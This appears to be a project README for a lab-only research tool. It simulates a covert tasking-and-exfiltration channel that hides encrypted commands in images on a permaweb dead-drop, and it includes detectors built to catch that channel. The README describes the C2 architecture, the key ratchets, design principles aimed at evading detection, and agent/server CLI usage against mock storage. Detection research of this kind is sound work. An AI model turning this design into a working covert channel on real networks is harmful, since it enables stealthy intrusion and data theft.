<div align="center">

# <span style="color:#22d3ee">PROJECT RATCHET</span>

### <span style="color:#e2e8f0;font-weight:400">Covert tasking + exfiltration channel **and** the defensive evaluation framework used to detect it</span>

**Lab-only research.** No real targets. No mainnet.

[![Lab only](https://img.shields.io/badge/Lab_only-true-f97316)](https://shields.io/)
[![Python](https://img.shields.io/badge/Python-3.10%2B-22d3ee?logo=python&logoColor=white)](https://shields.io/)
[![Mock Arweave](https://img.shields.io/badge/Arweave-mock_only-64748b)](https://shields.io/)
[![Tests](https://img.shields.io/badge/tests-15%2F15-green)](https://shields.io/)
[![License GPLv3](https://img.shields.io/badge/License-GPLv3-ef4444)](LICENSE)

</div>

---

## <span style="color:#22d3ee">▍Why this exists</span>

Project Ratchet is an **adversary fixture** built to answer a defensive question: *if a sophisticated threat actor ran a covert tasking-and-exfiltration channel through an immutable permaweb dead-drop, what would a defender actually see?*

The repository has two halves:

1. **The fixture** — a working simulation of that channel (this is what the offensive demo walks you through).
2. **The defensive framework** — detectors that consume the fixture's instrumentation to raise alerts for three adversarial scenarios.

In other words: **the defense is the product; the fixture is the lab.** All of it runs sandboxed with mock storage — nothing touches a real network.

---

## <span style="color:#22d3ee">▍Live demo</span>

The fastest way to see it is the self-narrating demo script. It runs the real closed loop once, captures the *actual* per-stage output, then replays it under styled stage headers with live run artifacts.

```bash
./DEMO.sh          # paced, presenter-driven narration
./DEMO.sh --fast   # minimal delays (CI / quick check)
```

What the demo shows end-to-end:

```
server tasking → encrypt (ratcheted AES-GCM) → keyed stego embed → upload
→ agent fetch/extract/decrypt → VM execute → exfil → server retrieve
```

The final artifacts section prints the **real** bytecode length, payload envelope, cover path, and both transaction IDs from the run — so what you see on screen is genuinely what executed.

> <span style="color:#e2e8f0">**Defensive scenario CLI:** under construction. The `scenario` subcommand (`key-steal`, `key-corrupt`, `rng-subversion`) wires the injectors, detectors, and reports together. Tests for the detection rules live in `src/test_harness.py`; the 15 core fixture tests pass today.</span>

---

## <span style="color:#22d3ee">▍Architecture</span>

### The channel (fixture)

Four roles form a closed loop:

| Role | Contribution |
|------|--------------|
| **Command Server** | Composes tasking bytecode, encrypts under a ratchet key, hides it in a cover image via keyed steganography, uploads to Arweave (or mock); retrieves + decrypts exfil |
| **Arweave (mock)** | Immutable dead-drop storage — `MockArweave` for the lab |
| **Centralized Platform** | One-time bootstrap delivery of the first tasking image |
| **Simulated Agent** | Fetches tasking, extracts, decrypts, executes bytecode in an ephemeral VM, exfiltrates, wipes all artifacts |

### The framework (defense)

The fixture is pervasively instrumented with no-op-safe event emission. A collector can be attached to capture an ordered event timeline, which the detectors scan:

| Event·Class | Detectable signal |
|-------------|-------------------|
| `FILE_READ` / `ARWEAVE_UPLOAD` | Sensitive-path read; read→exfil chain (S1) |
| `KEYFILE_LOAD` / `DECRYPT_FAIL` | Ratchet desync suspect, auth failure (S3) |
| `STEGO_EMBED` / `STEGO_EXTRACT` | Embed/extract integrity failures |
| `RATCHET_ADVANCE` | One-way ratchet movement (key fingerprints only — **no raw keys in telemetry**) |

---

## <span style="color:#22d3ee">▍Key hierarchy</span>

| Key | Purpose | Persistence |
|-----|---------|-------------|
| `K_root` | Master key; derives all others | Server-only, **never on agent** |
| `K_ratchet` | Tasking ratchet (server → agent) | Advances after each task decrypt |
| `K_exfil_ratchet` | Exfiltration ratchet (agent → server) | Advances after each exfil |
| `K_cmd` | Per-message AES-256-GCM key | Ephemeral; zeroed after use |
| `K_extract` | Steganographic position PRNG seed | Long-term, embedded at deployment |

> `K_root` is never referenced in agent code paths — a verifiable security property, asserted by the test harness.

---

## <span style="color:#22d3ee">▍Scenario coverage</span>

| ID | Scenario | Detector(s) | Status |
|----|----------|-------------|--------|
| **S1** | Cryptographic key stealing | `monitor_key_steal` → `SENSITIVE_READ`, `READ_EXFIL_CHAIN` | Rule logic done |
| **S3** | Cryptographic key corruption | `monitor_key_corruption` → `DECRYPT_AUTH_FAIL`, `RATCHET_DESYNC_SUSPECT`; keyfile schema check | Rule logic done |
| **S2** | RNG / PRNG subversion | `monitor_rng_subversion` → health/boundary flags | Planned |

Scenario config, injectors, and the report/CLI plumbing are the remaining work.

---

## <span style="color:#22d3ee">▍File structure</span>

```
src/
    main.py              — CLI orchestrator (server + agent subcommands)
    keys.py              — key management, ratchet advancement, keyfile I/O
    assembler.py         — two-pass bytecode assembler (256-byte limit)
    vm.py                — stack VM with syscalls, ephemeral wipe, timeout
    crypto_wrapper.py    — AES-256-GCM encrypt/decrypt
    stego.py             — keyed LSB steganography with length prefix
    arweave_interface.py — MockArweave + real gateway
    defense/
        events.py        — event types, collector, alerts
        monitors.py      — S1–S3 detection rules
        scenarios.py     — scenario injectors + runners
        integrity.py     — keyfile + RNG health checks
        report.py        — JSON / text scenario reports
        cli.py           — `scenario` subcommand entrypoint
    test_harness.py      — 15 integration/isolation/failure tests
DEMO.sh                  — self-narrating demo (captures + replays real output)
```

---

## <span style="color:#22d3ee">▍Quickstart</span>

```bash
git clone <repo>
cd <repo>
python -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt

./DEMO.sh                    # watch the channel
python -m src.test_harness   # 15/15 core tests
```

### Manual CLI usage

```bash
# Server — send tasking
python -m src.main server --keyfile server.json \
    --task "PUSH32 42 HALT" --cover cover.png --wallet wallet.json --mock

# Agent — bootstrap fetch
python -m src.main agent --keyfile agent.json \
    --wallet wallet.json --bootstrap-url http://example.com/task.png --mock

# Server — retrieve exfil
python -m src.main server --keyfile server.json \
    --wallet wallet.json --mock --retrieve
```

`--bootstrap-url` and `--watch` are mutually exclusive. `--mock` uses `MockArweave` instead of the real network.

---

## <span style="color:#22d3ee">▍Design principles</span>

- **Indistinguishability** — payloads are cryptographically indistinguishable from random noise
- **Backward secrecy** — one-way HMAC ratchets prevent retrospective decryption
- **No persistent infrastructure** — after bootstrap, all communication flows through Arweave
- **Ephemeral execution** — VM state is zeroed and garbage-collected post-execution
- **No raw key bytes in telemetry** — events carry hashes and lengths only

---

## <span style="color:#ef4444">▍Known limitations</span>

- No post-compromise forward security (DH ratcheting deferred)
- Non-atomic keyfile writes (crash mid-write corrupts state)
- Preemptive VM timeout not enforced during blocking syscalls
- `zero_key` is best-effort (the `cryptography` library may retain internal key copies)
- Offensive sim is **lab/mock only** — real-network timing analysis is out of scope for the current deadline phase

---

## <span style="color:#22d3ee">▍License</span>

[GPL-3.0](LICENSE) — because the defensive story this tool enables is worth keeping open.
